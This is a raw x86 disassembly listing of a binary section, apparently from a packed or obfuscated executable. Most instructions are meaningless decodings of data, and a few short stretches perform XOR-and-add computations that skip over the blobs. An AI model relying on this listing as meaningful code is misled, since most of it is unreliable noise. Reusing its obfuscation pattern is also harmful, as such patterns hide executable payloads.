  40bcdf:	xor    edi,DWORD PTR [eax-0xa443c]
  40bce5:	out    dx,al
  40bce6:	fwait
  40bce7:	jae    0x40bc8b
  40bce9:	fstp   st(3)
  40bceb:	adc    BYTE PTR [ecx-0x71],cl
  40bcee:	mul    cl
  40bcf0:	cmp    al,0xfb
  40bcf2:	or     al,0xd3
  40bcf4:	and    BYTE PTR [eax-0x714ff2cf],dl
  40bcfa:	push   ebx
  40bcfb:	mov    al,0xfb
  40bcfd:	dec    eax
  40bcfe:	and    eax,0x27b95e67
  40bd03:	fidiv  WORD PTR [ecx]
  40bd05:	cmp    edi,DWORD PTR ss:[ecx]
  40bd08:	cs shl eax,cl
  40bd0b:	and    ch,ah
  40bd0d:	jno    0x40bcaa
  40bd0f:	and    ebp,DWORD PTR [edx]
  40bd11:	imul   ebx,esp,0xffffffff
  40bd14:	ds int3 
  40bd16:	cmc    
  40bd17:	ja     0x40bc9d
  40bd19:	in     al,0xc7
  40bd1b:	mov    ebx,0x64c88f80
  40bd20:	je     0x40bd25
  40bd22:	call   0xb60a:0xfafb9daa
  40bd29:	sub    DWORD PTR [ebx-0x63],ebp
  40bd2c:	and    BYTE PTR [eax-0x23fdbfce],0x2
  40bd33:	dec    ebp
  40bd34:	mov    edx,0xf2c6b5c4
  40bd39:	fistp  DWORD PTR [esi+0x6cc6e2fb]
  40bd3f:	sub    al,0xf8
  40bd41:	xor    DWORD PTR fs:[ebp-0x1d9aded3],edi
  40bd48:	inc    ebx
  40bd49:	pop    esp
  40bd4a:	pop    ds
  40bd4b:	xor    eax,DWORD PTR [ebp-0x1445ec45]
  40bd51:	les    esp,FWORD PTR [edi+0x174a90e7]
  40bd57:	scas   eax,DWORD PTR es:[edi]
  40bd58:	jae    0x40bd61
  40bd5a:	jl     0x40bcf5
  40bd5c:	pop    es
  40bd5d:	adc    cl,BYTE PTR [esi-0x2611a4a9]
  40bd63:	cmc    
  40bd64:	sub    BYTE PTR [edx+0x53],bl
  40bd67:	ret    
  40bd68:	push   es
  40bd69:	call   0xc6fc:0xfd5671a9
  40bd70:	inc    edi
  40bd71:	mov    ecx,0xf184024e
  40bd76:	mov    esi,0xe5730ffe
  40bd7b:	push   0x5b
  40bd7d:	dec    esi
  40bd7e:	mov    esp,0x770aa67b
  40bd83:	loopne 0x40bdcd
  40bd85:	ret    0xc2ce
  40bd88:	ret    
  40bd89:	cmp    eax,ecx
  40bd8b:	dec    ecx
  40bd8c:	fnstsw WORD PTR gs:[edx-0x36]
  40bd90:	pop    eax
  40bd91:	mov    ?,WORD PTR [ebx]
  40bd93:	int3   
  40bd94:	icebp  
  40bd95:	shl    ecx,cl
  40bd97:	rol    ah,cl
  40bd99:	retf   0xd668
  40bd9c:	imul   esi,DWORD PTR [edi+eiz*8],0x6b
  40bda0:	inc    edx
  40bda1:	ja     0x40bde9
  40bda3:	xchg   ecx,eax
  40bda4:	bswap  edx
  40bda6:	and    al,bh
  40bda8:	ss jp  0x40bd7a
  40bdab:	ret    
  40bdac:	and    edi,ebx
  40bdae:	int    0xa9
  40bdb0:	cs jb  0x40be2a
  40bdb3:	jb     0x40bd9c
  40bdb5:	cmp    al,0x42
  40bdb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bdb8:	out    0x10,eax
  40bdba:	daa    
  40bdbb:	fisttp WORD PTR [edi+0x7de85218]
  40bdc1:	cwde   
  40bdc2:	sub    ebx,DWORD PTR [esi-0x233afff9]
  40bdc8:	push   esi
  40bdc9:	pop    es
  40bdca:	mov    esi,0xe325959e
  40bdcf:	inc    edx
  40bdd0:	xor    ch,BYTE PTR [ebp+0x2d]
  40bdd3:	js     0x40bd84
  40bdd5:	rcl    DWORD PTR ds:0x334e759e,0xb8
  40bddc:	shl    BYTE PTR [edx+0x377d9d00],cl
  40bde2:	rep outs dx,DWORD PTR ds:[esi]
  40bde4:	imul   edi,DWORD PTR [ebx+0x50],0x3a17614a
  40bdeb:	rcl    BYTE PTR [edx-0x2777f0df],cl
  40bdf1:	stc    
  40bdf2:	int3   
  40bdf3:	ins    DWORD PTR es:[edi],dx
  40bdf4:	mov    al,ds:0x3d35f20a
  40bdf9:	mov    eax,ds:0x396f7590
  40bdfe:	out    0x1e,al
  40be00:	dec    edi
  40be01:	pop    esp
  40be02:	push   es
  40be03:	and    ecx,DWORD PTR [eax]
  40be05:	jo     0x40bdaa
  40be07:	add    al,0xe9
  40be09:	scas   al,BYTE PTR es:[edi]
  40be0a:	mov    ecx,0x8f573e8f
  40be0f:	(bad)  
  40be11:	mov    eax,0xf4b07f09
  40be16:	mov    dh,0x38
  40be18:	div    BYTE PTR [ebp+0x63]
  40be1b:	mov    dl,0xd1
  40be1d:	xchg   esi,eax
  40be1e:	jne    0x40be55
  40be20:	rol    bl,cl
  40be22:	or     eax,esi
  40be24:	fwait
  40be25:	out    dx,al
  40be26:	lods   al,BYTE PTR ds:[esi]
  40be27:	add    bl,0xef
  40be2a:	add    al,BYTE PTR [edi+0x26]
  40be2d:	cmp    al,BYTE PTR [eax]
  40be2f:	test   DWORD PTR [ebx],esp
  40be31:	pop    es
  40be32:	imul   cx,WORD PTR [esi],0x6b6b
  40be37:	rcr    DWORD PTR [ebx-0x51b5612b],1
  40be3d:	mov    eax,0x330f9c49
  40be42:	lods   eax,DWORD PTR ds:[esi]
  40be43:	sbb    dl,BYTE PTR [eax]
  40be45:	fs pop es
  40be47:	fdiv   DWORD PTR [edx-0x78]
  40be4a:	hlt    
  40be4b:	outs   dx,BYTE PTR ds:[esi]
  40be4c:	cmp    BYTE PTR [ebp-0x3b],0xde
  40be50:	pusha  
  40be51:	sub    esp,DWORD PTR [esi]
  40be53:	cmp    eax,0x58f64ab3
  40be58:	or     DWORD PTR [ebx-0x110ca0d7],edi
  40be5e:	aas    
  40be5f:	mov    al,0xc7
  40be61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be62:	repnz push cs
  40be64:	add    DWORD PTR ds:0x2d5818dc,ebp
  40be6a:	aam    0xaf
  40be6c:	rcr    BYTE PTR [edx],0x1d
  40be6f:	data16 das 
  40be71:	out    0x7,al
  40be73:	lahf   
  40be74:	shl    bh,cl
  40be76:	daa    
  40be77:	outs   dx,BYTE PTR ds:[esi]
  40be78:	ret    
  40be79:	enter  0x7349,0x68
  40be7d:	or     ebp,DWORD PTR [esi]
  40be7f:	imul   eax,DWORD PTR [ecx+0x64],0x7b
  40be83:	mov    ch,0xea
  40be85:	mov    ds:0xce297044,al
  40be8a:	loopne 0x40bee2
  40be8c:	sub    ah,ch
  40be8e:	ja     0x40be6e
  40be90:	mov    DWORD PTR [esi+0x39],edi
  40be93:	inc    edi
  40be94:	fisub  WORD PTR [esi-0xdf15dab]
  40be9a:	into   
  40be9b:	mov    BYTE PTR [esi],al
  40be9d:	mov    dl,bh
  40be9f:	xor    al,BYTE PTR [eax+0x1b]
  40bea2:	push   ss
  40bea3:	into   
  40bea4:	out    dx,al
  40bea5:	adc    al,0x46
  40bea7:	repz and DWORD PTR [eax],eax
  40beaa:	neg    BYTE PTR [edx+0x25b60a42]
  40beb0:	dec    edi
  40beb1:	lods   eax,DWORD PTR ds:[esi]
  40beb2:	push   cs
  40beb3:	push   cs
  40beb4:	xor    dl,BYTE PTR [edi+0x3b]
  40beb7:	repz push edx
  40beb9:	inc    edi
  40beba:	mul    DWORD PTR [ebp+eax*8+0x4e2159d9]
  40bec1:	and    dl,BYTE PTR [esi+esi*8-0x660b6d76]
  40bec8:	(bad)  
  40bec9:	out    0x86,al
  40becb:	sti    
  40becc:	xchg   ecx,eax
  40becd:	aas    
  40bece:	aaa    
  40becf:	rcr    DWORD PTR [eax],cl
  40bed1:	add    ecx,edi
  40bed3:	ret    0xcb21
  40bed6:	jg     0x40bf08
  40bed8:	jmp    0x40bea1
  40beda:	adc    al,0xe9
  40bedc:	push   0xffffffb8
  40bede:	test   BYTE PTR [esi+0x22],al
  40bee1:	pop    esi
  40bee2:	in     al,0x1a
  40bee4:	in     al,0xd3
  40bee6:	sbb    eax,0x51085435
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi+0x4b4e031]
  40bf27:	add    BYTE PTR [eax+0x387e7ef9],0x7c
  40bf2e:	jle    0x40bfae
  40bf30:	es xchg ebx,eax
  40bf32:	jge    0x40bf22
  40bf34:	mov    al,0x0
  40bf36:	mov    ebp,0xb5985d77
  40bf3b:	fs stos BYTE PTR es:[edi],al
  40bf3d:	enter  0xd630,0x92
  40bf41:	pop    ds
  40bf42:	inc    esi
  40bf43:	hlt    
  40bf44:	sbb    al,0xc9
  40bf46:	cmp    esi,DWORD PTR [edx]
  40bf48:	mov    cl,0x86
  40bf4a:	cli    
  40bf4b:	xor    eax,DWORD PTR [esi-0x3f]
  40bf4e:	mov    cl,0xdf
  40bf50:	dec    eax
  40bf51:	sub    al,0xbd
  40bf53:	sbb    ecx,DWORD PTR [edi]
  40bf55:	mov    ds:0x4e89daee,eax
  40bf5a:	dec    esi
  40bf5b:	and    BYTE PTR [ecx],al
  40bf5d:	pop    ebx
  40bf5e:	sub    eax,0xddd320cb
  40bf63:	pop    ecx
  40bf64:	push   edi
  40bf65:	mov    esi,0x3790b44b
  40bf6a:	addr16 popa 
  40bf6c:	stc    
  40bf6d:	or     ah,al
  40bf6f:	adc    ebp,DWORD PTR [ecx+eiz*4]
  40bf72:	fimul  DWORD PTR [edx+0x5d]
  40bf75:	in     eax,dx
  40bf76:	js     0x40befe
  40bf78:	push   esp
  40bf79:	adc    eax,0x3f90a34e
  40bf7e:	dec    esi
  40bf7f:	inc    ebp
  40bf80:	sahf   
  40bf81:	inc    edx
  40bf82:	dec    eax
  40bf83:	sub    BYTE PTR [ebx+0x13ca4ed6],al
  40bf89:	add    DWORD PTR [esi+0x3c5b20c9],ecx
  40bf8f:	push   ebp
  40bf90:	xor    BYTE PTR ds:[esi],bh
  40bf93:	pop    esp
  40bf94:	mov    esp,0x338cb55
  40bf99:	pop    edi
  40bf9a:	jecxz  0x40c017
  40bf9c:	repz pop edi
  40bf9e:	adc    BYTE PTR [ebx+ecx*4-0x67],0x35
  40bfa3:	xchg   ebx,eax
  40bfa4:	mov    ds:0xa6c855e4,al
  40bfa9:	mov    dl,dl
  40bfab:	pop    ebp
  40bfac:	ret    
  40bfad:	and    dl,BYTE PTR [ebp+0x62c26919]
  40bfb3:	lahf   
  40bfb4:	push   ecx
  40bfb5:	dec    ebp
  40bfb6:	dec    esp
  40bfb7:	pop    ebp
  40bfb8:	cmp    DWORD PTR [esi-0x3d],0xfffffff2
  40bfbc:	or     eax,0xafa6898c
  40bfc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bfc2:	aam    0x9
  40bfc4:	inc    esp
  40bfc5:	scas   eax,DWORD PTR es:[edi]
  40bfc6:	ror    esi,1
  40bfc8:	fwait
  40bfc9:	addr16 jo 0x40bf92
  40bfcc:	(bad)  
  40bfce:	mov    al,ds:0x8643a1b7
  40bfd3:	lahf   
  40bfd4:	mov    DWORD PTR [esi+eiz*2+0x59],edi
  40bfd8:	inc    eax
  40bfd9:	mov    al,0x27
  40bfdb:	cmp    al,0x3
  40bfdd:	clc    
  40bfde:	xchg   DWORD PTR [ebp-0x1],esp
  40bfe1:	inc    ecx
  40bfe2:	jns    0x40c05f
  40bfe4:	add    edi,ecx
  40bfe6:	xchg   DWORD PTR ds:0x7981509a,ecx
  40bfec:	sbb    ebx,ecx
  40bfee:	retf   
  40bfef:	mov    cs,WORD PTR [ebx+edi*8]
  40bff2:	mov    BYTE PTR [ecx+0x2f2becfb],0x85
  40bff9:	dec    ebp
  40bffa:	fcmovnu st,st(6)
  40bffc:	stc    
  40bffd:	aad    0xf7
  40bfff:	fwait
  40c000:	mov    al,0xfe
  40c002:	dec    ecx
  40c003:	push   ds
  40c004:	or     esi,DWORD PTR [edi+0x5d]
  40c007:	mov    bl,0xf3
  40c009:	shr    ah,0x5e
  40c00c:	push   ss
  40c00d:	loop   0x40c08e
  40c00f:	out    0xb8,eax
  40c011:	repnz pusha 
  40c013:	test   eax,0x2a82366f
  40c018:	dec    eax
  40c019:	sub    BYTE PTR [ecx],dl
  40c01b:	mov    esi,0x5880a36
  40c020:	push   ebx
  40c021:	pop    ds
  40c022:	mov    bh,0x2b
  40c024:	setno  BYTE PTR ds:0x73e37271
  40c02b:	imul   ecx,DWORD PTR [esi-0x5b],0xffffffc6
  40c02f:	push   ds
  40c030:	es or  al,0xa5
  40c033:	je     0x40c030
  40c035:	outs   dx,BYTE PTR ds:[esi]
  40c036:	dec    ecx
  40c037:	sub    dh,BYTE PTR [eax-0x14]
  40c03a:	push   edx
  40c03b:	stc    
  40c03c:	dec    ecx
  40c03d:	mov    ch,0x9b
  40c03f:	mov    esi,0xa3815d85
  40c044:	data16 xor BYTE PTR [ecx-0x47],dh
  40c048:	mov    dh,dl
  40c04a:	hlt    
  40c04b:	lds    edi,FWORD PTR [esi]
  40c04d:	inc    eax
  40c04e:	repnz xor eax,0x8fe5090
  40c054:	pop    edx
  40c055:	dec    ebp
  40c056:	inc    ebx
  40c057:	or     BYTE PTR [ecx+0x38],0x68
  40c05b:	mov    dh,0x41
  40c05d:	inc    ecx
  40c05e:	(bad)  
  40c060:	xor    dl,dh
  40c062:	dec    esi
  40c063:	mov    DWORD PTR [ebx+0x40],edi
  40c066:	pop    ebx
  40c067:	call   0x90e8:0x6f6e9af
  40c06e:	cmp    bl,BYTE PTR [edx]
  40c070:	mov    al,0x65
  40c072:	push   edx
  40c073:	sbb    eax,0x5cda5b9
  40c078:	sar    BYTE PTR [edx-0x63],0x8b
  40c07c:	mov    cl,0xd
  40c07e:	or     edx,0x638f0fff
  40c084:	jae    0x40c04b
  40c086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c087:	aas    
  40c088:	ins    DWORD PTR es:[edi],dx
  40c089:	cmp    eax,0x2b33136d
  40c08e:	sub    DWORD PTR ss:[ecx+0x7f59fad2],0xffffffee
  40c096:	sar    DWORD PTR [ecx+0x2cadea65],1
  40c09c:	push   cs
  40c09d:	fmul   st,st(7)
  40c09f:	iret   
  40c0a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0a1:	dec    edx
  40c0a2:	out    0x4f,al
  40c0a4:	das    
  40c0a5:	arpl   WORD PTR [edx],cx
  40c0a7:	sub    BYTE PTR [ecx],cl
  40c0a9:	gs pop ebp
  40c0ab:	ror    BYTE PTR [ecx],1
  40c0ad:	jae    0x40c09a
  40c0af:	cmp    esp,DWORD PTR [edx]
  40c0b1:	and    DWORD PTR [eax],0x2c410ab3
  40c0b7:	xchg   ebp,eax
  40c0b8:	xor    ah,BYTE PTR [edx+0x1edbda66]
  40c0be:	mov    dl,dh
  40c0c0:	enter  0x64a7,0x4c
  40c0c4:	mov    al,ds:0x48a7646b
  40c0c9:	jle    0x40c0de
  40c0cb:	push   esi
  40c0cc:	scas   al,BYTE PTR es:[edi]
  40c0cd:	mov    ch,bl
  40c0cf:	adc    BYTE PTR [ebp+0x46],dl
  40c0d2:	add    BYTE PTR [edx],ch
  40c0d4:	and    dh,BYTE PTR [ebx-0x10801de7]
  40c0da:	dec    edi
  40c0db:	stos   BYTE PTR es:[edi],al
  40c0dc:	sub    BYTE PTR [edi+0xf77679d],0x39
  40c0e3:	or     ebp,edi
  40c0e5:	enter  0xbdcb,0x16
  40c0e9:	xor    DWORD PTR [ebx-0x63b9eb4b],ebx
  40c0ef:	fidiv  DWORD PTR [esi+0x11]
  40c0f2:	mov    al,ds:0xc044e94b
  40c0f7:	add    al,0xbf
  40c0f9:	sbb    dl,BYTE PTR [eax-0x9]
  40c0fc:	das    
  40c0fd:	out    dx,al
  40c0fe:	adc    cl,0xec
  40c101:	mov    esp,0xc988776f
  40c106:	jmp    0x40c146
  40c108:	xchg   DWORD PTR [esi],eax
  40c10a:	adc    al,0xdf
  40c10c:	jmp    0xe22b:0xe0286c9c
  40c113:	jb     0x40c126
  40c115:	push   ebx
  40c116:	ins    BYTE PTR es:[edi],dx
  40c117:	pushf  
  40c118:	xchg   edx,eax
  40c119:	dec    edi
  40c11a:	popf   
  40c11b:	loopne 0x40c130
  40c11d:	(bad)  [ecx+0x4d]
  40c120:	cmp    esi,DWORD PTR [eax+ecx*2]
  40c123:	dec    ecx
  40c124:	sub    al,0x95
  40c126:	ror    ebx,cl
  40c128:	aaa    
  40c129:	pushw  0x29be
  40c12d:	jb     0x40c170
  40c12f:	into   
  40c130:	mov    dh,0xa1
  40c132:	mov    al,ds:0x662ca0dd
  40c137:	dec    ebp
  40c138:	add    al,0x3
  40c13a:	pop    ecx
  40c13b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c13c:	imul   eax,DWORD PTR [ebp+0x735e6b59],0xffffffe4
  40c143:	scas   eax,DWORD PTR es:[edi]
  40c144:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c145:	bound  edx,QWORD PTR [eax]
  40c147:	pop    esp
  40c148:	mov    cl,BYTE PTR [eax+0x13480ef3]
  40c14e:	repz adc eax,0xa0f0b89c
  40c154:	or     edi,DWORD PTR [ebx]
  40c156:	mov    al,0x64
  40c158:	ficom  WORD PTR [edx]
  40c15a:	xbegin 0x3c24665d
  40c160:	cdq    
  40c161:	xlat   BYTE PTR ds:[ebx]
  40c162:	adc    DWORD PTR ds:0x2af85105,esi
  40c168:	mov    al,ds:0xf9a38133
  40c16d:	adc    eax,0x4f251b16
  40c172:	jmp    0x40c163
  40c174:	std    
  40c175:	rol    DWORD PTR [edi+0x458b49cb],cl
  40c17b:	in     al,0xf
  40c17d:	scas   eax,DWORD PTR es:[edi]
  40c17e:	shr    DWORD PTR [ebx],0xe0
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xa9
  40c196:	pop    edx
  40c197:	dec    ebp
  40c198:	stc    
  40c199:	dec    edx
  40c19a:	xchg   DWORD PTR [esi+0x7e],edi
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	pop    edi
  40c1a2:	sub    BYTE PTR [ebx],al
  40c1a4:	sub    esi,esi
  40c1a6:	(bad)  
  40c1a7:	cli    
  40c1a8:	xchg   ebx,eax
  40c1a9:	fisttp WORD PTR [esi+eiz*4+0x6f0c0ade]
  40c1b0:	xchg   ebx,eax
  40c1b1:	lods   eax,DWORD PTR ds:[esi]
  40c1b2:	sbb    esi,DWORD PTR [edx+0x56b96b95]
  40c1b8:	and    DWORD PTR [edx],eax
  40c1ba:	loop   0x40c1db
  40c1bc:	loopne 0x40c15f
  40c1be:	inc    ebp
  40c1bf:	rcr    DWORD PTR [eax+0x2b7fbe05],0x97
  40c1c6:	scas   al,BYTE PTR es:[edi]
  40c1c7:	sahf   
  40c1c8:	inc    ecx
  40c1c9:	sub    DWORD PTR [ebx+ebx*2+0x52],esi
  40c1cd:	not    BYTE PTR ds:0x8ee21d67
  40c1d3:	mov    ch,0xa
  40c1d5:	push   es
  40c1d6:	push   cs
  40c1d7:	push   edi
  40c1d8:	rcr    BYTE PTR [edx-0x24],1
  40c1db:	jmp    0x40c1d8
  40c1dd:	imul   edx
  40c1df:	inc    ebx
  40c1e0:	lods   eax,DWORD PTR ds:[esi]
  40c1e1:	dec    eax
  40c1e2:	js     0x40c1f5
  40c1e4:	and    bh,BYTE PTR [eax]
  40c1e6:	push   edx
  40c1e7:	retf   
  40c1e8:	mov    bl,0x80
  40c1ea:	(bad)  
  40c1ec:	(bad)  
  40c1ed:	xor    DWORD PTR [bx],edx
  40c1f0:	cmp    cl,BYTE PTR [ecx-0x69]
  40c1f3:	popa   
  40c1f4:	sub    bh,bl
  40c1f6:	out    0x5b,al
  40c1f8:	push   cs
  40c1f9:	loope  0x40c218
  40c1fb:	cmp    al,0x46
  40c1fd:	mov    dl,0x1f
  40c1ff:	xchg   ebx,eax
  40c200:	outs   dx,BYTE PTR ds:[esi]
  40c201:	repz fisub WORD PTR [edx-0x29]
  40c205:	add    bl,BYTE PTR [ebx]
  40c207:	jmp    0x40c22b
  40c209:	cdq    
  40c20a:	cmp    cl,dl
  40c20c:	pop    edi
  40c20d:	loope  0x40c24a
  40c20f:	push   ecx
  40c210:	ret    
  40c211:	jbe    0x23683609
  40c217:	(bad)  
  40c218:	into   
  40c219:	cld    
  40c21a:	inc    esp
  40c21b:	xor    BYTE PTR [ebp-0x71dbbaa3],al
  40c221:	test   al,0x0
  40c223:	loopne 0x40c231
  40c225:	mov    al,0x2d
  40c227:	inc    esi
  40c228:	into   
  40c229:	jg     0x40c27f
  40c22b:	test   BYTE PTR [esi],bh
  40c22d:	pop    ebx
  40c22e:	pop    esi
  40c22f:	clc    
  40c230:	mov    edi,0x44c6fd19
  40c235:	cmp    eax,0x6910ceb7
  40c23a:	push   esi
  40c23b:	sub    BYTE PTR [eax+0x25],al
  40c23e:	cmc    
  40c23f:	mov    bl,0x90
  40c241:	fld    QWORD PTR [ebx]
  40c243:	pop    ecx
  40c244:	mov    dl,0x73
  40c246:	inc    ebx
  40c247:	clc    
  40c248:	inc    esi
  40c249:	adc    BYTE PTR [esi],al
  40c24b:	in     al,0xea
  40c24d:	mov    esi,0x432fa8e2
  40c252:	loope  0x40c20e
  40c254:	xchg   esp,ecx
  40c256:	cdq    
  40c257:	push   edx
  40c258:	mov    dh,0x20
  40c25a:	in     eax,0xb4
  40c25c:	(bad)  
  40c25d:	mov    eax,0x71def0cc
  40c262:	leave  
  40c263:	pop    ebx
  40c264:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c265:	adc    dh,BYTE PTR [edx]
  40c267:	sti    
  40c268:	jmp    0x40c28b
  40c26a:	pop    esp
  40c26b:	add    esi,esp
  40c26d:	mov    dh,0x96
  40c26f:	pop    ds
  40c270:	clc    
  40c271:	sbb    eax,0xfbe7b4d2
  40c276:	idiv   DWORD PTR [eax]
  40c278:	cmp    eax,0x8486bfa8
  40c27d:	pop    edi
  40c27e:	(bad)  
  40c27f:	fimul  DWORD PTR [edi]
  40c281:	cdq    
  40c282:	and    BYTE PTR [eax-0x9b3652f],cl
  40c288:	sahf   
  40c289:	es cwde 
  40c28b:	nop
  40c28c:	sub    bl,0x9a
  40c28f:	outs   dx,DWORD PTR ds:[esi]
  40c290:	xlat   BYTE PTR ds:[ebx]
  40c291:	cmc    
  40c292:	ds push edi
  40c294:	int    0x1d
  40c296:	pop    ebp
  40c297:	and    DWORD PTR [eax],edx
  40c299:	(bad)  ds:0xd72e4574
  40c29f:	dec    ecx
  40c2a0:	mov    eax,ds:0x2bc8c725
  40c2a5:	cmp    ebx,edx
  40c2a7:	int    0xe8
  40c2a9:	mov    bh,0x65
  40c2ab:	mov    cl,0x22
  40c2ad:	pop    eax
  40c2ae:	and    al,0xb0
  40c2b0:	ret    
  40c2b1:	mov    ecx,0x2e83947d
  40c2b6:	int3   
  40c2b7:	dec    esi
  40c2b8:	cwde   
  40c2b9:	sar    DWORD PTR [ebx-0x6f],1
  40c2bc:	fisttp WORD PTR [ebx-0x3]
  40c2bf:	push   edi
  40c2c0:	and    DWORD PTR [edi+0x59],ebx
  40c2c3:	adc    bl,bh
  40c2c5:	imul   ecx,DWORD PTR [esi+edi*2+0x1b3eea8c],0xa2b4c984
  40c2d0:	mov    BYTE PTR [eax-0x4929a778],bh
  40c2d6:	add    DWORD PTR [ebp-0x60],esp
  40c2d9:	add    al,0xfe
  40c2db:	push   edi
  40c2dc:	pop    ds
  40c2dd:	repz pop ss
  40c2df:	push   ebx
  40c2e0:	jmp    DWORD PTR [edi+ebx*1-0x1c0c24cd]
  40c2e7:	mov    gs,WORD PTR [edx+0x25]
  40c2ea:	adc    BYTE PTR [edx+0x2f],dl
  40c2ed:	lea    edi,[ebx+esi*1+0xd]
  40c2f1:	cs dec eax
  40c2f3:	(bad)  
  40c2f4:	in     al,0xf3
  40c2f6:	test   eax,0x9b9f74a1
  40c2fb:	in     al,0x1f
  40c2fd:	or     bl,BYTE PTR [ecx]
  40c2ff:	ror    DWORD PTR [ebx*2-0x2cced9ec],1
  40c306:	fwait
  40c307:	sub    dh,BYTE PTR [edi-0x47]
  40c30a:	pop    eax
  40c30b:	fist   DWORD PTR [esi+0x1a]
  40c30e:	mov    ch,0x25
  40c310:	push   DWORD PTR [ebx]
  40c312:	cmc    
  40c313:	adc    DWORD PTR [ecx+eax*2-0x353d2350],ebp
  40c31a:	(bad)  
  40c31b:	sub    edx,ebx
  40c31d:	jmp    0x9d0a:0xa8920cab
  40c324:	fimul  WORD PTR [ebp-0x3d]
  40c327:	mov    esp,0xe4f73bf1
  40c32c:	xchg   edx,eax
  40c32d:	imul   edx,DWORD PTR [edi+0xac0d56c],0x2f485005
  40c337:	cmp    ecx,ecx
  40c339:	js     0x40c3ae
  40c33b:	(bad)  
  40c33c:	push   0xffffffaa
  40c33e:	std    
  40c33f:	adc    BYTE PTR [ebx-0x7c],dh
  40c342:	pop    edi
  40c343:	bound  edi,QWORD PTR [ecx]
  40c345:	jge    0x40c389
  40c347:	sti    
  40c348:	jmp    0xd3524a2c
  40c34d:	jg     0x40c2f4
  40c34f:	arpl   WORD PTR [esi],dx
  40c351:	sub    al,0x18
  40c353:	outs   dx,BYTE PTR ds:[esi]
  40c354:	sti    
  40c355:	inc    edx
  40c356:	arpl   WORD PTR [eax],cx
  40c358:	xchg   ch,cl
  40c35a:	xchg   BYTE PTR [ebp-0x69b73dba],al
  40c360:	dec    ebp
  40c361:	les    esi,FWORD PTR [ebp+0x50b77ef5]
  40c367:	sub    edi,DWORD PTR [ebx]
  40c369:	sbb    edx,DWORD PTR [edi]
  40c36b:	mov    ds:0x90c7eff7,eax
  40c370:	lahf   
  40c371:	jbe    0x40c353
  40c373:	mov    bh,0xed
  40c375:	xor    al,BYTE PTR [eax]
  40c377:	xchg   edi,eax
  40c378:	test   eax,0xc2b0bd8d
  40c37d:	dec    edx
  40c37e:	ja     0x40c337
  40c380:	lock loopne 0x40c346
  40c383:	pop    eax
  40c384:	popa   
  40c385:	cmc    
  40c386:	mov    ch,BYTE PTR [edx-0x30]
  40c389:	(bad)  
  40c38b:	stos   DWORD PTR es:[edi],eax
  40c38c:	jl     0x40c367
  40c38e:	lahf   
  40c38f:	mov    DWORD PTR ds:0xbf1538e3,edi
  40c395:	stos   DWORD PTR es:[edi],eax
  40c396:	sub    DWORD PTR [ebx+esi*1],ebx
  40c399:	fmul   QWORD PTR [ecx]
  40c39b:	push   ebx
  40c39c:	ror    BYTE PTR [ebp-0x14bab0dd],cl
  40c3a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a3:	jns    0x40c3e4
  40c3a5:	jo     0x40c3ff
  40c3a7:	cmp    eax,0xd71324cc
  40c3ac:	mov    ch,0x65
  40c3ae:	sbb    DWORD PTR [eax+0x10],0xffffffd6
  40c3b2:	cwde   
  40c3b3:	pop    esp
  40c3b4:	adc    eax,0x14a97239
  40c3b9:	mov    al,0x91
  40c3bb:	mov    eax,0xf4a6d5af
  40c3c0:	dec    edx
  40c3c1:	mov    dl,0xc7
  40c3c3:	scas   al,BYTE PTR es:[edi]
  40c3c4:	stos   BYTE PTR es:[edi],al
  40c3c5:	xchg   edi,eax
  40c3c6:	inc    esi
  40c3c7:	push   ds
  40c3c8:	in     al,dx
  40c3c9:	repnz pop edi
  40c3cb:	lods   eax,DWORD PTR ds:[esi]
  40c3cc:	test   al,0x94
  40c3ce:	out    dx,al
  40c3cf:	or     ch,BYTE PTR [edx*8-0x1f15ed76]
  40c3d6:	dec    esi
  40c3d7:	inc    edi
  40c3d8:	mov    bl,0x1a
  40c3da:	loop   0x40c408
  40c3dc:	or     eax,0x4556903c
  40c3e1:	xchg   BYTE PTR [edx+0x5e4e0269],bl
  40c3e7:	mov    eax,DWORD PTR [ebp-0x4]
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
